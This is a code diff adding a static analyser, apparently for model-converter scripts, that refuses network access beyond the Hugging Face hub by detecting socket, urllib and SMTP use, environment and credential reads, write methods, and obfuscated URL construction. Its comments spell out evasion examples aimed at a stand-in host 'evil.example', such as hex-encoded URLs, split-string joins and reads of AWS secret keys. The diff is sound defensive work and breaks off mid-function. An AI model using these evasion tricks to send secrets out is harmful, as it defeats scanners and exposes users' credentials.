@@ -57,6 +57,8 @@ import ast
 import logging
 import os
 import re
+import threading
+import string
 from dataclasses import dataclass
 
 __all__ = [
@@ -122,6 +124,1448 @@ RE_NETWORK = re.compile(
     r"|\bhttp\.client\b"
     r"|\bhttp\.server\b",
 )
+
+# Hosts a converter legitimately talks to.
+MODEL_HUB_HOSTS = frozenset(("huggingface.co", "hf.co"))
+
+# The scheme only.
+RE_URL_SCHEME = re.compile(r"https?://", re.IGNORECASE)
+RE_AUTHORITY_END = re.compile(r"[/?#]")
+
+# How far back a scheme can reach from its separator.
+MAX_SCHEME = 12
+RE_HOSTNAME = re.compile(r"^[A-Za-z0-9.\-]+(?::[0-9]+)?$")
+# A URL whose authority is already over: what follows cannot change the host.
+RE_AUTHORITY_CLOSED = re.compile(r"https?://[^/?#]*[/?#]", re.IGNORECASE)
+
+
+# Network APIs the allowance cannot vouch for, so their presence refuses it.
+# socket and http.client name their destination as a bare host rather than a
+# URL: a file could carry a hub URL and open socket.create_connection((
+# "evil.example", 443)) beside it, and the allowance would call that talking
+# only to the hub. urllib is here for the other half of the question.
+RE_UNVOUCHABLE_NETWORK = re.compile(
+    r"\bsocket\s*\.\s*(?:socket|create_connection)\b"
+    r"|\bhttp\.(?:client|server)\b"
+    r"|\burllib\.request\b"
+    r"|\burlopen\s*\(",
+)
+
+
+# Primitives that build a string, and so a host, out of view of the folding in
+# _literal_text: bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65")
+# .decode() is "https://evil.example" with no URL anywhere in the source for
+# the literal walk to read.
+RE_UNVOUCHABLE_STRING_BUILD = re.compile(
+    r"\bfromhex\s*\("
+    r"|\bunhexlify\s*\("
+    r"|\bmaketrans\s*\("
+    r"|\.translate\s*\("
+    r"|\.to_bytes\s*\("
+    r"|\bcodecs\s*\.\s*(?:decode|encode)\b"
+    r"|\bbase64\s*\.\s*\w+\s*\("
+    # unquote("https%3A%2F%2Fevil.example%2Fc") is a destination too, and the
+    # literal that spells it carries no scheme for the walk to find. urlparse is
+    # NOT here: upstream's utility.py parses URLs with it, and parsing one is not
+    # building one.
+    r"|\bunquote(?:_plus|_to_bytes)?\s*\(",
+)
+
+
+# The shape the allowance is actually for: a token-authenticated READ from the
+# hub.
+HUB_TOKEN_ENV_NAMES = frozenset((
+    "HF_TOKEN", "HUGGING_FACE_HUB_TOKEN", "HUGGINGFACE_HUB_TOKEN", "HF_HUB_TOKEN",
+))
+
+# `request`, `send` and `stream` are here because session.request("POST", ...),
+# Session.send(Request("POST", ...).prepare()) and httpx Client.stream("POST",
+# ...) are writes the named methods do not cover, and reading the method out of
+# any of them would mean following an argument that need not be a literal.
+WRITE_METHODS = frozenset((
+    "post", "put", "patch", "delete", "request", "send", "stream",
+))
+
+# The environment under another name. os.environ and os.getenv are attributes
+# and are read normally; these are the bare names an alias or a from-import
+# leaves behind, which _env_reads does not inspect.
+ENV_ALIAS_NAMES = frozenset(("environ", "getenv", "environb", "getenvb"))
+
+# Introspection, which is the only way a docstring becomes a value.
+DOCSTRING_READERS = frozenset((
+    "__doc__", "vars", "__dict__", "inspect", "pydoc", "getdoc", "help",
+    "__getattribute__",
+))
+
+RE_WHOLE_ENV = re.compile(
+    r"\bos\.environ\s*\.\s*copy\s*\("
+    r"|\bdict\s*\(\s*os\.environ\s*\)"
+    r"|\bos\.environ\.items\s*\(",
+)
+
+
+def _is_os_environ(node):
+    return isinstance(node, ast.Attribute) and node.attr == "environ"
+
+
+def _env_reads(tree):
+    """`(names, dynamic)` for the environment this file reads by name."""
+    names, dynamic = set(), False
+    # Every os.environ in the file, and the ones this walk actually accounts
+    # for.
+    environs = {
+        id(node) for node in ast.walk(tree)
+        if isinstance(node, ast.Attribute) and node.attr == "environ"
+    }
+    accounted = set()
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Subscript) and _is_os_environ(node.value):
+            accounted.add(id(node.value))
+            index = node.slice
+            if isinstance(index, ast.Constant) and isinstance(index.value, str):
+                names.add(index.value)
+            else:
+                dynamic = True
+        elif isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
+            func = node.func
+            is_env_get = func.attr == "get" and _is_os_environ(func.value)
+            is_getenv = func.attr in ("getenv", "getenvb") and (
+                (isinstance(func.value, ast.Name) and func.value.id == "os")
+                or (isinstance(func.value, ast.Attribute) and func.value.attr == "os")
+            )
+            if is_env_get:
+                accounted.add(id(func.value))
+            # Only .get().
+            if func.attr in ("getenv", "getenvb") and not is_getenv:
+                # import os as o, then o.getenv("AWS_SECRET_ACCESS_KEY").
+                dynamic = True
+                continue
+            if not (is_env_get or is_getenv):
+                continue
+            # os.environ.get(key = "HF_TOKEN") is the same read spelled with a
+            # keyword, and calling it dynamic refused a legitimate download.
+            key = node.args[0] if node.args else next(
+                (
+                    keyword.value for keyword in node.keywords
+                    if keyword.arg == "key"
+                ),
+                None,
+            )
+            # bytes as well as str: os.getenvb(b"AWS_SECRET_ACCESS_KEY") is
+            # the same read on Unix, and exempting it left the collected set
+            # holding the hub token alone.
+            name = _literal_text(key) if key is not None else None
+            if name is not None:
+                names.add(name)
+            else:
+                dynamic = True
+    if environs - accounted:
+        dynamic = True
+    return names, dynamic
+
+
+def _writes_anything(tree):
+    """Whether this file so much as NAMES a write method."""
+    return any(
+        (isinstance(node, ast.Attribute) and node.attr in WRITE_METHODS)
+        or (isinstance(node, ast.Name) and node.id in WRITE_METHODS)
+        # vars(requests)["post"] and requests.__dict__["post"] leave the method
+        # name as a string and nothing else, and "po" + "st" is the same string
+        # spelled to miss a Constant check.
+        or _literal_text(node) in WRITE_METHODS
+        or (
+            isinstance(node, ast.ImportFrom)
+            and any(alias.name in WRITE_METHODS for alias in node.names)
+        )
+        for node in ast.walk(tree)
+    )
+
+
+# Modules whose attributes are the things this refuses by name.
+SENSITIVE_MODULES = frozenset(("os", "requests", "httpx", "urllib", "socket"))
+
+
+# Modules whose members name a destination as a bare host, or write in a way
+# the method names cannot see. urllib.parse is deliberately absent: it is
+# string manipulation, RE_NETWORK excludes it for the same reason, and
+# upstream's utility.py imports urlparse from it twice.
+UNVOUCHABLE_MODULES = (
+    "socket", "http.client", "http.server", "urllib.request",
+    "smtplib", "ftplib", "poplib", "imaplib", "nntplib", "telnetlib",
+    "xmlrpc.client", "paramiko", "pysftp", "websocket", "websockets",
+)
+
+# The same door for the string builders.
+STRING_BUILDER_MODULES = (
+    "base64", "binascii", "codecs", "quopri", "uu", "struct",
+)
+STRING_BUILDER_NAMES = frozenset((
+    "b64decode", "b64encode", "b32decode", "b16decode", "b85decode",
+    "a85decode", "standard_b64decode", "urlsafe_b64decode", "decodebytes",
+    "unhexlify", "hexlify", "decode", "encode",
+    "unquote", "unquote_plus", "unquote_to_bytes",
+))
+
+# Functions that BUILD a URL out of one. urlparse and urlsplit are not here:
+# upstream reads its URL with urlparse, and reading one is not rebuilding it.
+URL_ASSEMBLERS = frozenset((
+    "ParseResult", "SplitResult", "ParseResultBytes", "SplitResultBytes",
+    "DefragResult", "DefragResultBytes", "geturl",
+    # And the URL objects the clients build, which take their host as a field:
+    # httpx.URL(scheme = "https", host = "evil.example") spells a destination
+    # no argument of which is a URL.
+    "URL", "Url", "URI", "Uri",
+))
+
+URL_REWRITE_METHODS = frozenset((
+    "copy_with", "copy_set_param", "copy_add_param", "copy_merge_params",
+    "with_host", "with_scheme", "with_path", "with_query", "with_port",
+    "with_user", "with_password", "with_fragment", "with_netloc",
+    "set_host", "set_scheme", "update_query", "_replace",
+))
+
+URL_BUILDERS = frozenset((
+    "urljoin", "urlunparse", "urlunsplit", "urldefrag",
+))
+
+
+def _dynamic_imports(tree, aliases = None):
+    """`(names, unreadable)` for every import spelled as a call."""
+    if aliases is None:
+        aliases = _call_aliases(tree)
+    names, unreadable = set(), False
+    for node in ast.walk(tree):
+        # builtins.__dict__["__import__"]("smtplib") leaves the importer as a
+        # string and nothing else, exactly as the write methods and the
+        # environment names did.
+        if _literal_text(node) in ("__import__", "import_module"):
+            return set(), True
+        if not isinstance(node, ast.Call):
+            continue
+        if _called_name(node, aliases) not in ("__import__", "import_module"):
+            continue
+        text = _literal_text(node.args[0]) if node.args else None
+        if text is None or UNKNOWN_PIECE in text:
+            unreadable = True
+        else:
+            names.add(text)
+    return names, unreadable
+
+
+# Connection APIs that name a bare host from a module too ordinary to refuse
+# whole: asyncio is imported for all sorts of reasons, and open_connection(
+# "evil.example", 443) is not one of them.
+BARE_HOST_APIS = frozenset((
+    "open_connection", "open_unix_connection", "create_connection",
+    "create_unix_connection", "start_server", "start_unix_server",
+    "sock_connect", "create_datagram_endpoint",
+))
+
+
+def _imports_an_unvouchable_api(tree, aliases = None):
+    """Whether a connection API arrives by from-import."""
+    def unvouchable(name):
+        return any(
+            name == module or name.startswith(module + ".")
+            for module in UNVOUCHABLE_MODULES
+        )
+
+    dynamic, unreadable = _dynamic_imports(tree, aliases)
+    if unreadable or any(unvouchable(name) for name in dynamic):
+        return True
+    if aliases is None:
+        aliases = _call_aliases(tree)
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Call) and _called_name(node, aliases) in BARE_HOST_APIS:
+            return True
+        if isinstance(node, ast.ImportFrom) and any(
+            alias.name in BARE_HOST_APIS for alias in node.names
+        ):
+            return True
+    for node in ast.walk(tree):
+        if isinstance(node, ast.ImportFrom) and node.module:
+            # The member counts with its parent: from http import client is
+            # http.client, and reading the module alone saw only "http".
+            if unvouchable(node.module) or any(
+                unvouchable(f"{node.module}.{alias.name}") for alias in node.names
+            ):
+                return True
+        elif isinstance(node, ast.Import):
+            # import socket as s: the qualified pattern sees no socket. call
+            # anywhere, so the import itself is the only place it is named.
+            if any(unvouchable(alias.name) for alias in node.names):
+                return True
+    return False
+
+
+def _builds_text_from_numbers(tree):
+    """Whether text is assembled out of character codes."""
+    for node in ast.walk(tree):
+        if (
+            isinstance(node, ast.Name) and node.id == "chr"
+        ) or (
+            isinstance(node, ast.Attribute) and node.attr == "chr"
+        ):
+            return True
+        if not isinstance(node, ast.Call):
+            continue
+        name = (
+            node.func.attr if isinstance(node.func, ast.Attribute)
+            else node.func.id if isinstance(node.func, ast.Name) else ""
+        )
+        if name in ("bytes", "bytearray") and node.args and isinstance(
+            node.args[0],
+            (ast.List, ast.Tuple, ast.Set, ast.ListComp, ast.SetComp,
+             ast.GeneratorExp, ast.DictComp),
+        ):
+            return True
+    return False
+
+
+def _templates_are_oversized(tree):
+    """Whether any formatting template is longer than this will parse."""
+    for node in ast.walk(tree):
+        if (
+            isinstance(node, ast.Call)
+            and isinstance(node.func, ast.Attribute)
+            and node.func.attr in ("format", "format_map")
+            and isinstance(node.func.value, ast.Constant)
+            and isinstance(node.func.value.value, str)
+            and len(node.func.value.value) > MAX_TEMPLATE
+        ):
+            return True
+        if (
+            isinstance(node, ast.BinOp)
+            and isinstance(node.op, ast.Mod)
+            and isinstance(node.left, ast.Constant)
+            and isinstance(node.left.value, str)
+            and len(node.left.value) > MAX_TEMPLATE
+        ):
+            return True
+    return False
+
+
+def _joins_something_unreadable(tree):
+    """Whether a literal separator joins pieces this cannot enumerate."""
+    for node in ast.walk(tree):
+        if not (
+            isinstance(node, ast.Call)
+            and isinstance(node.func, ast.Attribute)
+            and node.func.attr == "join"
+            and len(node.args) == 1
+            and not node.keywords
+        ):
+            continue
+        if _join_parts(node) is None:
+            return True
+        if _literal_text(node.func.value) is None:
+            # A separator this cannot read, folded as a hole, hid a whole URL
+            # between two readable pieces: str().join(("htt", "ps://evil.
+            # example/c")) reads as htt<hole>ps://..., where the hole breaks
+            # the scheme and nothing was recorded as a destination.
+            return True
+    return False
+
+
+def _call_aliases(tree, assignments = None):
+    """`{local name: original name}` for imports and for rebinding assignments."""
+    aliases = _import_aliases(tree)
+    for name, value in (assignments or _single_assignments(tree)).items():
+        if isinstance(value, ast.Name):
+            aliases[name] = aliases.get(value.id, value.id)
+        elif isinstance(value, ast.Attribute):
+            aliases[name] = aliases.get(value.attr, value.attr)
+    return aliases
+
+
+def _called_name(node, aliases):
+    """The name a call site uses, read through any alias."""
+    name = (
+        node.func.attr if isinstance(node.func, ast.Attribute)
+        else node.func.id if isinstance(node.func, ast.Name) else ""
+    )
+    return aliases.get(name, name)
+
+
+def _import_aliases(tree):
+    """`{local name: imported name}` for every alias an import binds."""
+    aliases = {}
+    for node in ast.walk(tree):
+        if isinstance(node, (ast.Import, ast.ImportFrom)):
+            for alias in node.names:
+                if alias.asname:
+                    aliases[alias.asname] = alias.name.split(".")[-1]
+    return aliases
+
+
+def _imports_a_string_builder(tree, aliases = None):
+    """Whether a string decoder arrives by import, under any name."""
+    def builder_module(name):
+        return any(
+            name == module or name.startswith(module + ".")
+            for module in STRING_BUILDER_MODULES
+        )
+
+    def builder_member(node):
+        return node.module and any(
+            builder_module(f"{node.module}.{alias.name}") for alias in node.names
+        )
+
+    dynamic, _ = _dynamic_imports(tree, aliases)
+    if any(builder_module(name) for name in dynamic):
+        return True
+    for node in ast.walk(tree):
+        if isinstance(node, ast.ImportFrom):
+            if (node.module and builder_module(node.module)) or builder_member(node):
+                return True
+            if any(alias.name in STRING_BUILDER_NAMES for alias in node.names):
+                return True
+        elif isinstance(node, ast.Import):
+            if any(builder_module(alias.name) for alias in node.names):
+                return True
+    return False
+
+
+def _reaches_through_getattr(tree):
+    """Whether a write or the environment is reached by a computed lookup."""
+    for node in ast.walk(tree):
+        if not (
+            isinstance(node, ast.Call)
+            and isinstance(node.func, ast.Name)
+            and node.func.id == "getattr"
+            and len(node.args) >= 2
+        ):
+            continue
+        name = _literal_text(node.args[1])
+        if name is not None:
+            if name in WRITE_METHODS or name in ENV_ALIAS_NAMES:
+                return True
+            continue
+        target = node.args[0]
+        if isinstance(target, ast.Name) and target.id in SENSITIVE_MODULES:
+            return True
+        if isinstance(target, ast.Attribute) and target.attr in SENSITIVE_MODULES:
+            return True
+    return False
+
+
+def _aliases_the_environment(tree):
+    """Whether the environment is reachable here under another name."""
+    called = {
+        id(node.func) for node in ast.walk(tree)
+        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
+    }
+    return any(
+        (isinstance(node, ast.Name) and node.id in ENV_ALIAS_NAMES)
+        # vars(os)["environ"] and os.__dict__["environ"] leave the name as a
+        # string and nothing else, and "en" + "viron" is the same string
+        # spelled to miss a Constant check.
+        or _literal_text(node) in ENV_ALIAS_NAMES
+        or (
+            isinstance(node, ast.ImportFrom)
+            and any(alias.name in ENV_ALIAS_NAMES for alias in node.names)
+        )
+        # read_secret = os.getenv keeps no reserved spelling anywhere, so the
+        # name it lands under says nothing.
+        or (
+            isinstance(node, ast.Attribute)
+            and node.attr in ("getenv", "getenvb", "environb")
+            and id(node) not in called
+        )
+        for node in ast.walk(tree)
+    )
+
+
+# Only %s, %r and %% are folded below, under a mapping key or without one.
+RE_UNSAFE_PERCENT = re.compile(r"%(?:\([^)]*\)[^sr%]|(?!\()[^sr%])")
+
+# Stands in for a piece of a string this cannot read.
+UNKNOWN_PIECE = "\x00"
+
+# Passes over the tree allowed to settle which names carry a URL.
+MAX_CARRIER_PASSES = 16
+
+# Ceiling on a folded join.
+MAX_FOLDED_JOIN = 1 << 20
+
+
+# A template longer than this is not parsed at all.
+MAX_TEMPLATE = 1 << 16
+
+
+class _FoldBudgetExceeded(Exception):
+    """Raised when one allowance decision has folded more text than it may."""
+
+
+# Generous next to a real converter, which folds a few kilobytes: the whole
+# gguf-py package folds well under one megabyte across every pass.
+MAX_TOTAL_FOLD = 32 * MAX_FOLDED_JOIN
+
+# Per thread, not per module: two exports running at once shared one counter,
+# so the first to finish cleared it under the second, their charges were added
+# together, and the bound stopped meaning anything for either.
+_fold_state = threading.local()
+
+
+def _charge_fold(text):
+    budget = getattr(_fold_state, "budget", None)
+    if budget is None or text is None:
+        return text
+    budget -= len(text)
+    _fold_state.budget = budget
+    if budget < 0:
+        raise _FoldBudgetExceeded("folded more text than one decision may")
+    return text
+
+
+def _fields_are_plain(template):
+    """Whether every replacement field is a bare name, with no spec at all."""
+    if len(template) > MAX_TEMPLATE:
+        return False                    # too long to read, so never folded
+    try:
+        fields = list(string.Formatter().parse(template))
+    except Exception:
+        return False                    # unparseable is unfoldable
+    return not any(
+        name is not None and (spec or conversion)
+        for _, name, spec, conversion in fields
+    )
+
+
+def _longest_argument(node):
+    """Length of the longest literal argument of a call, 0 when there is none."""
+    texts = [_literal_text(argument) for argument in node.args]
+    texts += [_literal_text(keyword.value) for keyword in node.keywords]
+    return max((len(text) for text in texts if text is not None), default = 0)
+
+
+# One percent conversion, in the full printf shape the operator accepts:
+RE_PERCENT_FIELD = re.compile(
+    r"%(?:\((?P<key>[^)]*)\))?[-#0 +]*(?:\d+|\*)?(?:\.(?:\d+|\*))?[hlL]?"
+    r"[diouxXeEfFgGcrsa]"
+)
+
+
+def _percent_is_oversized(template, values):
+    """Whether this formatting would materialise more than the fold ceiling."""
+    if len(template) > MAX_TEMPLATE:
+        return True                     # too long to read, so never folded
+    fields = len(RE_PERCENT_FIELD.findall(template))
+    longest = max((len(value) for value in values), default = 0)
+    return len(template) + fields * longest > MAX_FOLDED_JOIN
+
+
+def _percent_holes(template):
+    """The template with each percent conversion replaced by a hole."""
+    pieces, index = [], 0
+    for match in RE_PERCENT_FIELD.finditer(template):
+        pieces.append(template[index:match.start()])
+        pieces.append(UNKNOWN_PIECE)
+        index = match.end()
+    pieces.append(template[index:])
+    return "".join(pieces).replace("%%", "%")
+
+
+# The callable spellings of the operators that build a string, each mapped to
+# the method it really is. set.add is not one of them: these take two arguments.
+OPERATOR_FUNCTIONS = {
+    "add": "__add__", "concat": "__add__",
+    "iadd": "__add__", "iconcat": "__add__",
+    "mod": "__mod__", "imod": "__mod__",
+    "mul": "__mul__", "imul": "__mul__",
+}
+
+# And the methods themselves, read by folding the operator they stand for
+# rather than by repeating its rules here.
+OPERATOR_METHODS = {
+    "__add__": ast.Add, "__mod__": ast.Mod, "__mul__": ast.Mult,
+}
+
+
+def _operator_text(node):
+    """The text of an operator spelled as a call, or None."""
+    if not (
+        isinstance(node, ast.Call)
+        and not node.keywords
+        and isinstance(node.func, ast.Attribute)
+        and node.func.attr in OPERATOR_METHODS
+        and len(node.args) == 1
+    ):
+        return None
+    return _literal_text_uncharged(
+        ast.BinOp(
+            left = node.func.value,
+            op = OPERATOR_METHODS[node.func.attr](),
+            right = node.args[0],
+        )
+    )
+
+
+def _replace_text(node):
+    """The text of a literal `"...".replace(old, new)`, or None."""
+    if not (
+        isinstance(node, ast.Call)
+        and isinstance(node.func, ast.Attribute)
+        and node.func.attr == "replace"
+        and not node.keywords
+        and len(node.args) == 2
+    ):
+        return None
+    receiver = _literal_text(node.func.value)
+    old = _literal_text(node.args[0])
+    new = _literal_text(node.args[1])
+    if receiver is None or old is None or new is None:
+        return None
+    if len(receiver) * (len(new) + 1) > MAX_FOLDED_JOIN:
+        return None                     # the same output ceiling as the join
+    try:
+        return receiver.replace(old, new)
+    except (TypeError, ValueError):
+        return None
+
+
+def _rewrites_a_constant(node, aliases = None):
+    """Whether a literal string is transformed into text this cannot read."""
+    if not isinstance(node, ast.Call):
+        return False
+    if isinstance(node.func, ast.Attribute):
+        receiver = node.func.value
+    elif _called_name(node, aliases or {}) in ("str", "bytes", "bytearray"):
+        # str(payload, "utf-16le") is the same decode through the constructor,
+        # and the type name is the only place the method appears at all.
+        receiver = node.args[0] if node.args else None
+    else:
+        return False
+    if receiver is None or _literal_text(receiver) is None:
+        return False
+    return _literal_text(node) is None
+
+
+def _format_holes(node, template):
+    """The template with every field replaced by a hole, or None."""
+    if len(template) > MAX_TEMPLATE:
+        return None
+    try:
+        fields = list(string.Formatter().parse(template))
+    except Exception:
+        return None
+    pieces = []
+    for literal, name, _spec, _conversion in fields:
+        pieces.append(literal)
+        if name is not None:
+            pieces.append(UNKNOWN_PIECE)
+    return "".join(pieces)
+
+
+def _format_text(node):
+    """The text of a literal `"...".format(...)`, or None."""
+    if not (
+        isinstance(node, ast.Call)
+        and isinstance(node.func, ast.Attribute)
+        and node.func.attr in ("format", "format_map")
+    ):
+        return None
+    template = _literal_text(node.func.value)
+    if template is None:
+        return None
+    if not _fields_are_plain(template):
+        return _format_holes(node, template)
+    if len(template) * (1 + _longest_argument(node)) > MAX_FOLDED_JOIN:
+        # One argument referenced by thousands of {0} fields expands far past
+        # the input cap, so the ceiling is on the OUTPUT, as it is for joins.
+        return _format_holes(node, template)
+    if node.func.attr == "format_map":
+        if node.keywords or len(node.args) != 1 or not isinstance(node.args[0], ast.Dict):
+            return _format_holes(node, template)
+        mapping = {}
+        for key, value in zip(node.args[0].keys, node.args[0].values):
+            name = _literal_text(key) if key is not None else None
+            text = _literal_text(value)
+            if name is None or text is None:
+                return _format_holes(node, template)
+            mapping[name] = text
+        try:
+            return template.format_map(mapping)
+        except Exception:
+            # Any exception at all:
+            return _format_holes(node, template)
+    arguments = [_literal_text(argument) for argument in node.args]
+    keywords = {
+        keyword.arg: _literal_text(keyword.value)
+        for keyword in node.keywords if keyword.arg is not None
+    }
+    if any(value is None for value in arguments) or any(
+        value is None for value in keywords.values()
+    ) or len(node.keywords) != len(keywords):
+        return _format_holes(node, template)
+    try:
+        return template.format(*arguments, **keywords)
+    except Exception:
+        return _format_holes(node, template)    # see format_map above
+
+
+def _join_nodes(node):
+    """`(separator, elements)` for `sep.join([...])`, or None."""
+    if not (
+        isinstance(node, ast.Call)
+        and isinstance(node.func, ast.Attribute)
+        and node.func.attr == "join"
+        and not node.keywords
+        and len(node.args) == 1
+        and isinstance(node.args[0], (ast.List, ast.Tuple))
+    ):
+        return None
+    return node.func.value, node.args[0].elts
+
+
+def _join_parts(node):
+    """The text of a `sep.join([...])`, with holes for what cannot be read."""
+    nodes = _join_nodes(node)
+    if nodes is None:
+        return None
+    separator_node, element_nodes = nodes
+    separator = _literal_text(separator_node)
+    separator = UNKNOWN_PIECE if separator is None else separator
+    elements = []
+    for element in element_nodes:
+        # `or` here turned a folded "" into the sentinel, and
+        # "".join(("https://huggingface.co", "")) then read as a host with an
+        # unreadable piece stuck to it: a CRITICAL on a benign download.
+        text = _literal_text(element)
+        elements.append(UNKNOWN_PIECE if text is None else text)
+    size = sum(map(len, elements)) + len(separator) * max(len(elements) - 1, 0)
+    if size > MAX_FOLDED_JOIN:
+        return None
+    return separator, elements
+
+
+def _literal_text(node):
+    """As _literal_text_uncharged, with every fold charged to the work budget."""
+    return _charge_fold(_literal_text_uncharged(node))
+
+
+def _literal_text_uncharged(node):
+    """The text a constant expression evaluates to, or None when it is not one."""
+    if isinstance(node, ast.Constant):
+        if isinstance(node.value, str):
+            return node.value
+        if isinstance(node.value, bytes):
+            return node.value.decode("utf-8", "replace")
+        return None
+    if isinstance(node, ast.JoinedStr):
+        # An f-string is the one construction that arrived here already split.
+        # f"https://{''}evil.example/log" left the scheme in one constant piece
+        # and the whole attacker hostname, in plain sight, in another that no
+        # longer had a scheme in front of it, so no host was read from it at
+        # all and a hub literal elsewhere granted the allowance.
+        pieces = []
+        for part in node.values:
+            if isinstance(part, ast.FormattedValue):
+                known = (
+                    None if (part.conversion not in (-1, None) or part.format_spec)
+                    else _literal_text(part.value)
+                )
+            else:
+                known = _literal_text(part)
+            pieces.append(UNKNOWN_PIECE if known is None else known)
+        return "".join(pieces)
+    rewritten = _replace_text(node)
+    if rewritten is not None:
+        return rewritten
+    formatted = _format_text(node)
+    if formatted is not None:
+        return formatted
+    parts = _join_parts(node)
+    if parts is not None:
+        # "".join(("htt", "ps://ev", "il.exa", "mple/c")) is a URL spelled out
+        # in full whose scheme never appears in any one piece, so nothing
+        # matched RE_URL_SCHEME and nothing was recorded as a destination.
+        separator, elements = parts
+        return separator.join(elements)
+    operated = _operator_text(node)
+    if operated is not None:
+        return operated
+    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Mult):
+        # "https" * 1 + "://evil.example/c" carries its scheme in a repetition,
+        # which was neither folded nor refused, so no literal in the file held
+        # a URL.
+        for text_side, count_side in (
+            (node.left, node.right), (node.right, node.left),
+        ):
+            text = _literal_text_uncharged(text_side)
+            if text is None:
+                continue
+            count = count_side.value if (
+                isinstance(count_side, ast.Constant)
+                and isinstance(count_side.value, int)
+                and not isinstance(count_side.value, bool)
+            ) else None
+            if count is None:
+                # The text itself and then a hole.
+                return text + UNKNOWN_PIECE
+            if count < 0:
+                return ""
+            if len(text) * count > MAX_FOLDED_JOIN:
+                return None             # the same output ceiling as the join
+            return text * count
+        return None
+    if not (isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod))):
+        return None
+    left = _literal_text(node.left)
+    if left is None:
+        return None
+    if isinstance(node.op, ast.Add):
+        right = _literal_text(node.right)
+        if right is None:
+            return None
+        if len(left) + len(right) > MAX_FOLDED_JOIN:
+            return None                 # the same output ceiling as the join
+        return left + right
+    if RE_UNSAFE_PERCENT.search(left):
+        return _percent_holes(left)
+    if isinstance(node.right, ast.Dict):
+        # "%(scheme)s://%(host)s/c" % {"scheme":
+        mapping = {}
+        for key, value in zip(node.right.keys, node.right.values):
+            name = _literal_text(key) if key is not None else None
+            text = _literal_text(value)
+            if name is None or text is None:
+                return _percent_holes(left)
+            mapping[name] = text
+        if _percent_is_oversized(left, mapping.values()):
+            return _percent_holes(left)
+        try:
+            return left % mapping
+        except (TypeError, ValueError, KeyError):
+            return _percent_holes(left)
+    operands = node.right.elts if isinstance(node.right, ast.Tuple) else [node.right]
+    values = [_literal_text(operand) for operand in operands]
+    if any(value is None for value in values):
+        return _percent_holes(left)
+    if _percent_is_oversized(left, values):
+        return _percent_holes(left)
+    try:
+        return left % tuple(values)
+    except (TypeError, ValueError):
+        return _percent_holes(left)
+
+
+def _mapping_key(node):
+    """The literal string key of a Subscript, or None for anything else."""
+    if not isinstance(node, ast.Subscript):
+        return None
+    key = _literal_text(node.slice)
+    return key if key is not None else None
+
+
+def _bound_names(target):
+    """Every name an assignment target binds, unpacking included."""
+    if isinstance(target, ast.Name):
+        return {target.id}
+    if isinstance(target, ast.Attribute):
+        return {target.attr}
+    if isinstance(target, ast.Starred):
+        return _bound_names(target.value)
+    if isinstance(target, (ast.Tuple, ast.List)):
+        names = set()
+        for element in target.elts:
+            names |= _bound_names(element)
+        return names
+    return set()
+
+
+def _reshapes_a_url(tree, assignments = None, aliases = None):
+    """Whether a URL this file spells out is transformed before it is used."""
+    carriers = set()
+    aliases = aliases if aliases is not None else _call_aliases(tree, assignments)
+
+    def called_name(node):
+        return _called_name(node, aliases)
+
+    def carries(node):
+        while isinstance(node, ast.NamedExpr):
+            node = node.value                   # (u := BASE).replace(...)
+        if isinstance(node, ast.Name) and node.id in carriers:
+            return True
+        if isinstance(node, ast.Attribute) and node.attr in carriers:
+            return True                         # cls.BASE_DOMAIN, self.BASE ...
+        text = _literal_text(node)
+        return bool(text) and bool(RE_URL_SCHEME.search(text))
+
+    def built_from_a_carrier(node):
+        if carries(node):
+            return True
+        if isinstance(node, ast.JoinedStr):
+            return any(
+                built_from_a_carrier(
+                    part.value if isinstance(part, ast.FormattedValue) else part
+                )
+                for part in node.values
+            )
+        if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
+            operands = [node.left]
+            operands += (
+                node.right.elts if isinstance(node.right, ast.Tuple) else [node.right]
+            )
+            return any(built_from_a_carrier(operand) for operand in operands)
+        if isinstance(node, ast.Dict):
+            # URLS = {"hub":
+            return any(
+                value is not None and built_from_a_carrier(value)
+                for value in node.values
+            )
+        if isinstance(node, ast.Subscript) and _mapping_key(node) is not None:
+            # A lookup by name reads the value out; it does not reshape it.
+            return built_from_a_carrier(node.value)
+        if isinstance(node, (ast.Tuple, ast.List, ast.Set)):
+            # BASE, = ("https://huggingface.co",): the value is a sequence, and
+            # which element lands on which name is not worth tracking, so every
+            # name the target binds carries when any element does.
+            return any(built_from_a_carrier(element) for element in node.elts)
+        nodes = _join_nodes(node)
+        if nodes is not None:
+            # "".join([BASE, "/x"]) carries: without this the join laundered the
+            # carrier and .replace() on the result was not a reshape of anything.
+            separator_node, element_nodes = nodes
+            return any(
+                built_from_a_carrier(part)
+                for part in [separator_node, *element_nodes]
+            )
+        return False
+
+    # Bounded, because each pass walks the whole tree and a chain of
+    # assignments that each carry the previous one needs a pass apiece: 2000 of
+    # them took 25 seconds, on the path that decides whether an export may run.
+    assignments = []
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Assign):
+            targets, value = node.targets, node.value
+        elif isinstance(node, (ast.AnnAssign, ast.NamedExpr)) and node.value:
+            targets, value = [node.target], node.value
+        else:
+            continue
+        names = set()
+        for target in targets:
+            names |= _bound_names(target)
+        if names:
+            assignments.append((names, value))
+
+    for _ in range(MAX_CARRIER_PASSES):
+        found = set()
+        for names, value in assignments:
+            if names <= carriers:
+                continue                # already carrying, nothing to learn
+            if built_from_a_carrier(value):
+                found |= names
+        if found <= carriers:
+            break
+        carriers |= found
+    else:
+        return True
+    def extends_the_authority(node):
+        """Whether this expression appends to a carrier past its authority."""
+        whole = _literal_text(node)
+        if whole is not None and UNKNOWN_PIECE not in whole:
+            # It folds COMPLETELY, so the walk reads the URL it really builds:
+            return False
+        def flatten(node):
+            # HUB + "/api/" + name parses as (HUB + "/api/") + name, so reading
+            # two parts put the path inside the first one and the check never
+            # saw the delimiter that had already ended the authority.
+            parts, stack = [], [node]
+            while stack:
+                item = stack.pop()
+                if isinstance(item, ast.BinOp) and isinstance(item.op, ast.Add):
+                    stack.extend([item.right, item.left])
+                else:
+                    parts.append(item)
+            return parts
+
+        if isinstance(node, ast.JoinedStr):
+            parts = node.values
+        elif isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
+            parts = flatten(node)
+        else:
+            return False
+        appended = False
+        for part in parts:
